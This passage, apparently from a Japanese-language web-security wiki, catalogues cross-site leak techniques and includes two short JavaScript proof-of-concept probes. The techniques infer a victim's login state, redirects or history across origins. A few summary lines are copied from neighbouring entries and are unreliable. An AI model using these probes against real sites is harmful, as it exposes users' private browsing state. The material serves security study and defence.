- **Inclusion Methods**: HTML Elements (Video, Audio)
- **Detectable Difference**: Status Code
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** Firefoxでは、クロスオリジンリクエストのステータスコードを正確に漏洩させることができます。
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
`MediaError`インターフェースのメッセージプロパティは、成功裏に読み込まれたリソースを一意に識別する特定の文字列を持っています。攻撃者はこの機能を利用して、メッセージの内容を観察することで、クロスオリジンリソースの応答ステータスを推測することができます。

### CORSエラー

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **概要:** セキュリティアサーション(SA)において、CORSエラーメッセージはリダイレクトされたリクエストの完全なURLを意図せずに公開します。
- **コード例**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

この技術により、攻撃者は**クロスオリジンサイトのリダイレクト先を抽出**することができます。具体的には、**CORS対応リクエスト**がユーザーの状態に基づいてリダイレクトを発行するターゲットサイトに送信され、ブラウザがそのリクエストを拒否した場合、**リダイレクトのターゲットの完全なURL**がエラーメッセージ内に開示されます。この脆弱性はリダイレクトの事実を明らかにするだけでなく、リダイレクトのエンドポイントや含まれる可能性のある**機密のクエリパラメータ**も公開します。

### SRIエラー

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **概要:** セキュリティアサーション(SA)において、CORSエラーメッセージはリダイレクトされたリクエストの完全なURLを意図せずに公開します。
- **コード例**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

攻撃者は**冗長なエラーメッセージ**を利用して、クロスオリジンの応答のサイズを推測することができます。これは、サブリソース整合性(SRI)のメカニズムによるもので、整合性属性を使用して、CDNから取得されたリソースが改ざんされていないことを検証します。SRIがクロスオリジンリソースで機能するためには、これらが**CORS対応**である必要があります。そうでなければ、整合性チェックの対象にはなりません。セキュリティアサーション(SA)において、CORSエラーXSリークと同様に、整合性属性を持つフェッチリクエストが失敗した後にエラーメッセージをキャプチャできます。攻撃者は、任意のリクエストの整合性属性に**偽のハッシュ値**を割り当てることで、このエラーを意図的に**トリガー**できます。SAでは、結果として得られるエラーメッセージが要求されたリソースのコンテンツ長を意図せずに明らかにします。この情報漏洩により、攻撃者は応答サイズの変動を識別でき、洗練されたXSリーク攻撃への道を開きます。

### CSP違反/検出

- **インクルージョンメソッド**: ポップアップ
- **検出可能な違い**: ステータスコード
- **詳細情報**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **概要:** CSPで被害者のウェブサイトのみを許可すると、異なるドメインにリダイレクトしようとするとCSPが検出可能なエラーをトリガーします。
- **コード例**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XSリークは、CSPを使用してクロスオリジンサイトが異なるオリジンにリダイレクトされたかどうかを検出できます。このリークはリダイレクトを検出できますが、さらにリダイレクトターゲットのドメインも漏洩します。この攻撃の基本的なアイデアは、**攻撃者サイトでターゲットドメインを許可する**ことです。ターゲットドメインにリクエストが発行されると、**クロスオリジンドメインにリダイレクト**されます。**CSPは**それへのアクセスをブロックし、**リーク技術として使用される違反レポートを作成します**。ブラウザによっては、**このレポートがリダイレクトのターゲット位置を漏洩する可能性があります**。\
最新のブラウザは、リダイレクト先のURLを示しませんが、クロスオリジンリダイレクトがトリガーされたことを検出することはできます。

### キャッシュ

- **インクルージョンメソッド**: フレーム、ポップアップ
- **検出可能な違い**: ページコンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **概要:** ファイルをキャッシュからクリアします。ターゲットページを開き、ファイルがキャッシュに存在するかどうかを確認します。
- **コード例:**

ブラウザは、すべてのウェブサイトに対して1つの共有キャッシュを使用する場合があります。オリジンに関係なく、ターゲットページが**特定のファイルを要求したかどうかを推測することが可能です**。

ページがユーザーがログインしている場合にのみ画像を読み込む場合、**リソースを無効に**し（キャッシュされていない場合は、詳細情報リンクを参照）、そのリソースを読み込む可能性のある**リクエストを実行**し、**不正なリクエスト**（例：過剰なリファラーヘッダーを使用）でリソースを読み込もうとします。リソースの読み込みが**エラーをトリガーしなかった**場合、それは**キャッシュされていた**からです。

### CSPディレクティブ

- **インクルージョンメソッド**: フレーム
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **概要:** CSPヘッダーディレクティブは、CSP iframe属性を使用して調査でき、ポリシーの詳細を明らかにします。
- **コード例**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome(GC)の新機能により、ウェブページはiframe要素に属性を設定することで**コンテンツセキュリティポリシー(CSP)**を提案でき、ポリシーディレクティブがHTTPリクエストと共に送信されます。通常、埋め込まれたコンテンツは**これをHTTPヘッダーを介して承認する必要があり**、さもなければ**エラーページが表示されます**。ただし、iframeがすでにCSPによって管理されており、新たに提案されたポリシーがより制限的でない場合、ページは通常通り読み込まれます。このメカニズムは、攻撃者がエラーページを特定することによってクロスオリジンページの**特定のCSPディレクティブを検出する**道を開きます。この脆弱性は修正されたとされていますが、私たちの調査結果は、エラーページを検出できる**新しいリーク技術**を明らかにしており、根本的な問題が完全には解決されていないことを示唆しています。

### **CORP**

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: ヘッダー
- **詳細情報**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **概要:** クロスオリジンリソースポリシー(CORP)で保護されたリソースは、許可されていないオリジンから取得されるとエラーを発生させます。
- **コード例**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORPヘッダーは比較的新しいウェブプラットフォームのセキュリティ機能で、設定されると**指定されたリソースへのノーコルスクロスオリジンリクエストをブロックします**。ヘッダーの存在は検出可能で、CORPで保護されたリソースは**取得されるとエラーを発生させます**。

### CORB

- **インクルージョンメソッド**: HTML要素
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **概要**: CORBは、リクエストに**`nosniff`ヘッダーが存在するかどうかを攻撃者が検出できる**ようにします。
- **コード例**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

攻撃についての詳細情報はリンクを確認してください。

### オリジンリフレクションの誤設定におけるCORSエラー <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **概要**: オリジンヘッダーが`Access-Control-Allow-Origin`ヘッダーに反映されている場合、リソースがすでにキャッシュに存在するかどうかを確認できます。
- **コード例**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

**Originヘッダー**が`Access-Control-Allow-Origin`ヘッダーに**反映されている**場合、攻撃者はこの動作を悪用して**CORSモードでリソースを取得しようとすることができます**。**エラー**が**トリガーされない**場合、それは**ウェブから正しく取得された**ことを意味します。エラーが**トリガーされる**場合、それは**キャッシュからアクセスされた**ためです（エラーは、キャッシュが元のドメインを許可するCORSヘッダーを持つ応答を保存しているために発生します）。\
オリジンが反映されていないがワイルドカードが使用されている場合（`Access-Control-Allow-Origin: *`）、これは機能しません。

## 読み取り可能な属性技術

### フェッチリダイレクト

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: ステータスコード
- **詳細情報**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **概要:** GCとSAは、リダイレクトが完了した後に応答のタイプ（opaque-redirect）を確認できます。
- **コード例**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"`および他のパラメータを使用してFetch APIを介してリクエストを送信すると、`response.type`属性を読み取ることができ、`opaqueredirect`と等しい場合、応答はリダイレクトでした。

### COOP

- **インクルージョンメソッド**: ポップアップ
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **概要:** クロスオリジンオープナーポリシー(COOP)で保護されたページは、クロスオリジンの相互作用からのアクセスを防ぎます。
- **コード例**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

攻撃者は、クロスオリジンHTTP応答におけるクロスオリジンオープナーポリシー(COOP)ヘッダーの存在を推測することができます。COOPは、外部サイトが任意のウィンドウ参照を取得するのを妨げるためにウェブアプリケーションによって使用されます。このヘッダーの可視性は、**`contentWindow`参照にアクセスしようとすることで判断できます**。COOPが条件付きで適用されるシナリオでは、**`opener`プロパティ**が明白な指標となります：COOPが有効な場合は**未定義**であり、無効な場合は**定義されています**。

### URL最大長 - サーバーサイド

- **インクルージョンメソッド**: Fetch API、HTML要素
- **検出可能な違い**: ステータスコード / コンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **概要:** リダイレクト応答の長さが大きすぎるため、サーバーがエラーで再生することがあるため、応答の違いを検出します。
- **コード例**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

サーバーサイドリダイレクトが**リダイレクト内でユーザー入力を使用し**、**追加データ**を持つ場合、この動作を検出することが可能です。通常、**サーバー**には**リクエスト長の制限**があります。もし**ユーザーデータ**がその**長さ - 1**であれば、**リダイレクト**が**そのデータを使用し**、**何かを追加**しているため、**エラーがトリガーされます**（エラーは、リダイレクトが元のデータを使用しているために発生します）。\
ユーザーにクッキーを設定できる場合、**十分なクッキーを設定することによって**この攻撃を実行することもできます（[**クッキーボム**](hacking-with-cookies/cookie-bomb.md)）。その結果、**正しい応答のサイズが増加**し、**エラー**がトリガーされます。この場合、同じサイトからこのリクエストをトリガーすると、`<script>`が自動的にクッキーを送信するため（エラーを確認できます）。\
**クッキーボム + XS-Search**の例は、この書き込みの意図された解決策に見つけることができます: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None`または同じコンテキストにいることが、この種の攻撃には通常必要です。

### URL最大長 - クライアントサイド

- **インクルージョンメソッド**: ポップアップ
- **検出可能な違い**: ステータスコード / コンテンツ
- **詳細情報**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **概要:** リダイレクト応答の長さが大きすぎるため、リクエストで違いが確認できる可能性があります。
- **コード例**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromiumのドキュメント](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length)によると、Chromeの最大URL長は2MBです。

> 一般的に、_ウェブプラットフォーム_にはURLの長さに制限はありません（ただし、2^31は一般的な制限です）。_Chrome_は、実用的な理由とプロセス間通信でのサービス拒否問題を回避するために、URLを最大**2MB**に制限しています。

したがって、**リダイレクトURLが一方のケースで大きい場合**、**2MBを超えるURLでリダイレクト**させることが可能です。これが発生すると、Chromeは**`about:blank#blocked`**ページを表示します。

**顕著な違い**は、**リダイレクト**が**完了**した場合、`window.origin`が**エラーをスロー**することです。クロスオリジンはその情報にアクセスできません。しかし、**制限**が達成され、読み込まれたページが**`about:blank#blocked`**であった場合、ウィンドウの**`origin`**は**親**のものであり、これは**アクセス可能な情報**です。

**2MB**に到達するために必要なすべての追加情報は、最初のURLの**ハッシュ**を介して追加できるため、**リダイレクトで使用されます**。

{{#ref}}
xs-search/url-max-length-client-side.md
{{#endref}}

### 最大リダイレクト

- **インクルージョンメソッド**: Fetch API、フレーム
- **検出可能な違い**: ステータスコード
- **詳細情報**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **概要:** ブラウザのリダイレクト制限を使用して、URLリダイレクトの発生を確認します。
- **コード例**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

ブラウザの**最大**リダイレクト数が**20**の場合、攻撃者は**19回のリダイレクト**でページを読み込もうとし、最終的に**被害者をテストされたページに送信**します。**エラー**がトリガーされる場合、そのページは**被害者をリダイレクトしようとしていた**ことになります。

### 履歴の長さ

- **インクルージョンメソッド**: フレーム、ポップアップ
- **検出可能な違い**: リダイレクト
- **詳細情報**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **概要:** JavaScriptコードがブラウザの履歴を操作し、長さプロパティでアクセスできます。
- **コード例**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**History API**は、JavaScriptコードがブラウザの履歴を操作できるようにし、**ユーザーが訪れたページを保存します**。攻撃者は、長さプロパティをインクルージョンメソッドとして使用できます：JavaScriptとHTMLのナビゲーションを検出するために。\
**`history.length`を確認し**、ユーザーに**ページに移動**させ、**元のオリジンに戻し**、**`history.length`の新しい値を確認します**。

### 同じURLでの履歴の長さ

- **インクルージョンメソッド**: フレーム、ポップアップ
- **検出可能な違い**: URLが推測したものと同じかどうか
- **概要:** 履歴の長さを悪用して、フレーム/ポップアップの位置が特定のURLにあるかどうかを推測できます。
- **コード例**: 以下

攻撃者はJavaScriptコードを使用して、**フレーム/ポップアップの位置を推測したものに操作し**、**すぐに**それを**`about:blank`に変更**することができます。履歴の長さが増加した場合、それはURLが正しかったことを意味し、**同じであれば再読み込みされないため**、増加する時間がありました。増加しなかった場合、それは**推測したURLを読み込もうとした**が、**すぐに**`about:blank`を読み込んだため、**推測したURLを読み込む際に履歴の長さは増加しなかった**ことを意味します。
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### フレームカウント

- **インクルージョンメソッド**: フレーム、ポップアップ
- **検出可能な違い**: ページコンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **概要**: `window.length` プロパティを調べて iframe 要素の数を評価します。
- **コード例**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` または `window.open` を介して開かれた **ウェブのフレームの数**をカウントすることで、**そのページ上のユーザーの状態**を特定するのに役立つかもしれません。\
さらに、ページが常に同じ数のフレームを持っている場合、フレームの数を**継続的に**チェックすることで、情報が漏洩する可能性のある**パターン**を特定するのに役立つかもしれません。

この技術の例として、Chromeでは、`embed` が内部で使用されるため、**PDF**を**フレームカウント**で**検出**できます。`zoom`、`view`、`page`、`toolbar` などのコンテンツに対する制御を許可する[オープンURLパラメータ](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)があり、この技術が興味深い場合があります。

### HTMLElements

- **インクルージョンメソッド**: HTML要素
- **検出可能な違い**: ページコンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **概要**: 漏洩した値を読み取って2つの可能な状態を区別します。
- **コード例**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML要素を通じた情報漏洩は、特にユーザー情報に基づいて動的メディアファイルが生成される場合や、メディアサイズを変更する透かしが追加される場合に、ウェブセキュリティの懸念事項です。攻撃者は、特定のHTML要素によって公開された情報を分析することで、可能な状態を区別するためにこれを悪用できます。

### HTML要素によって公開される情報

- **HTMLMediaElement**: この要素はメディアの `duration` と `buffered` 時間を明らかにし、そのAPIを介してアクセスできます。[HTMLMediaElementについての詳細](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: `videoHeight` と `videoWidth` を公開します。一部のブラウザでは、`webkitVideoDecodedByteCount`、`webkitAudioDecodedByteCount`、および `webkitDecodedFrameCount` などの追加プロパティが利用可能で、メディアコンテンツに関するより詳細な情報を提供します。[HTMLVideoElementについての詳細](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: この関数は、`totalVideoFrames` を含むビデオ再生品質に関する詳細を提供し、処理されたビデオデータの量を示すことができます。[getVideoPlaybackQuality()についての詳細](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: この要素は画像の `height` と `width` を漏洩します。ただし、画像が無効な場合、これらのプロパティは0を返し、`image.decode()` 関数は拒否され、画像が正しく読み込まれなかったことを示します。[HTMLImageElementについての詳細](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSSプロパティ

- **インクルージョンメソッド**: HTML要素
- **検出可能な違い**: ページコンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **概要**: ユーザーの状態やステータスに関連するウェブサイトのスタイリングの変化を特定します。
- **コード例**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

ウェブアプリケーションは、ユーザーの状態に応じて**ウェブサイトのスタイリングを変更する**ことがあります。クロスオリジンのCSSファイルは、**HTMLリンク要素**を使用して攻撃者のページに埋め込むことができ、**ルール**は攻撃者のページに**適用されます**。ページがこれらのルールを動的に変更する場合、攻撃者はユーザーの状態に応じてこれらの**違い**を**検出**できます。\
漏洩技術として、攻撃者は `window.getComputedStyle` メソッドを使用して特定のHTML要素の**CSS**プロパティを**読み取る**ことができます。その結果、影響を受ける要素とプロパティ名が知られている場合、攻撃者は任意のCSSプロパティを読み取ることができます。

### CSS履歴

- **インクルージョンメソッド**: HTML要素
- **検出可能な違い**: ページコンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **概要**: `:visited` スタイルがURLに適用されているかどうかを検出し、すでに訪問されたことを示します。
- **コード例**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> [**これ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)によると、これはヘッドレスChromeでは機能しません。

CSSの `:visited` セレクタは、ユーザーが以前に訪問した場合にURLを異なるスタイルで装飾するために使用されます。過去には、`getComputedStyle()` メソッドを使用してこれらのスタイルの違いを特定することができました。しかし、現代のブラウザは、このメソッドがリンクの状態を明らかにするのを防ぐためのセキュリティ対策を実施しています。これらの対策には、リンクが訪問されたかのように常に計算されたスタイルを返し、`:visited` セレクタで適用できるスタイルを制限することが含まれます。

これらの制限にもかかわらず、リンクの訪問状態を間接的に見分けることは可能です。1つの技術は、ユーザーをCSSに影響を与える領域に対話させることを含み、特に `mix-blend-mode` プロパティを利用します。このプロパティは、要素とその背景をブレンドすることを可能にし、ユーザーの対話に基づいて訪問状態を明らかにする可能性があります。

さらに、リンクのレンダリングタイミングを悪用することで、ユーザーの対話なしに検出を行うことができます。ブラウザは、訪問済みリンクと未訪問リンクを異なる方法でレンダリングする可能性があるため、レンダリングにおける測定可能な時間の違いを生じさせることがあります。タイミング分析を通じて訪問状態を検出可能にするために、タイミングの違いを増幅するために複数のリンクを使用するこの技術を示す概念実証（PoC）が、Chromiumのバグ報告で言及されました。

これらのプロパティとメソッドの詳細については、ドキュメントページを訪れてください：

- `:visited`: [MDNドキュメント](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDNドキュメント](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDNドキュメント](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame漏洩

- **インクルージョンメソッド**: フレーム
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **概要**: Google Chromeでは、X-Frame-Options制限によりクロスオリジンサイトに埋め込まれたページがブロックされると、専用のエラーページが表示されます。
- **コード例**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chromeでは、`X-Frame-Options` ヘッダーが "deny" または "same-origin" に設定されたページがオブジェクトとして埋め込まれると、エラーページが表示されます。Chromeは、このオブジェクトの `contentDocument` プロパティに対して空のドキュメントオブジェクト（`null` ではなく）を一意に返します。これは、iframeや他のブラウザとは異なります。攻撃者は、空のドキュメントを検出することでこれを悪用し、特に開発者がX-Frame-Optionsヘッダーを不一致に設定し、エラーページを見落とすことが多いため、ユーザーの状態に関する情報を明らかにする可能性があります。意識とセキュリティヘッダーの一貫した適用が、こうした漏洩を防ぐために重要です。

### ダウンロード検出

- **インクルージョンメソッド**: フレーム、ポップアップ
- **検出可能な違い**: ヘッダー
- **詳細情報**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **概要**: 攻撃者は、iframeを利用してファイルのダウンロードを識別できます。iframeの継続的なアクセス可能性は、ファイルのダウンロードが成功したことを示唆します。
- **コード例**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` ヘッダー、特に `Content-Disposition: attachment` は、ブラウザにコンテンツをインラインで表示するのではなく、ダウンロードするよう指示します。この動作は、ユーザーがファイルダウンロードをトリガーするページにアクセスできるかどうかを検出するために悪用できます。Chromiumベースのブラウザでは、このダウンロード動作を検出するためのいくつかの技術があります：

1. **ダウンロードバーの監視**:
- Chromiumベースのブラウザでファイルがダウンロードされると、ブラウザウィンドウの下部にダウンロードバーが表示されます。
- ウィンドウの高さの変化を監視することで、ダウンロードバーの出現を推測し、ダウンロードが開始されたことを示唆できます。
2. **iframeを使用したダウンロードナビゲーション**:
- `Content-Disposition: attachment` ヘッダーを使用してファイルダウンロードをトリガーするページは、ナビゲーションイベントを引き起こしません。
- iframeにコンテンツを読み込み、ナビゲーションイベントを監視することで、コンテンツの配置がファイルダウンロードを引き起こすかどうか（ナビゲーションなし）を確認できます。
3. **iframeなしのダウンロードナビゲーション**:
- iframe技術と同様に、この方法はiframeの代わりに `window.open` を使用します。
- 新しく開かれたウィンドウでナビゲーションイベントを監視することで、ファイルダウンロードがトリガーされたか（ナビゲーションなし）またはコンテンツがインラインで表示されたか（ナビゲーションが発生）を明らかにできます。

ログインユーザーのみがそのようなダウンロードをトリガーできるシナリオでは、これらの技術を使用して、ブラウザのダウンロードリクエストに対する応答に基づいてユーザーの認証状態を間接的に推測できます。

### パーティション化されたHTTPキャッシュバイパス <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **インクルージョンメソッド**: ポップアップ
- **検出可能な違い**: タイミング
- **詳細情報**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **概要**: 攻撃者は、iframeを利用してファイルのダウンロードを識別できます。iframeの継続的なアクセス可能性は、ファイルのダウンロードが成功したことを示唆します。
- **コード例**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> この技術が興味深い理由は、Chromeが現在**キャッシュパーティショニング**を持っており、新しく開かれたページのキャッシュキーは `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)` ですが、ngrokページを開いてfetchを使用すると、キャッシュキーは `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)` になります。**キャッシュキーが異なる**ため、キャッシュは共有できません。詳細はここで確認できます: [キャッシュのパーティショニングによるセキュリティとプライバシーの向上](https://developer.chrome.com/blog/http-cache-partitioning/)\
> （[**こちら**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)からのコメント）

サイト `example.com` が `*.example.com/resource` からリソースを含む場合、そのリソースは、リソースがトップレベルナビゲーションを介して直接要求された場合と同じ**キャッシュキー**を持ちます。これは、キャッシュキーがトップレベルの _eTLD+1_ とフレーム _eTLD+1_ で構成されているためです。

キャッシュにアクセスすることはリソースを読み込むよりも速いため、ページの位置を変更し、20ms（例えば）後にそれをキャンセルすることを試みることができます。停止後にオリジンが変更された場合、それはリソースがキャッシュされていたことを意味します。\
または、**潜在的にキャッシュされたページにいくつかのfetchを送信し、かかる時間を測定する**こともできます。

### 手動リダイレクト <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: リダイレクト
- **詳細情報**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
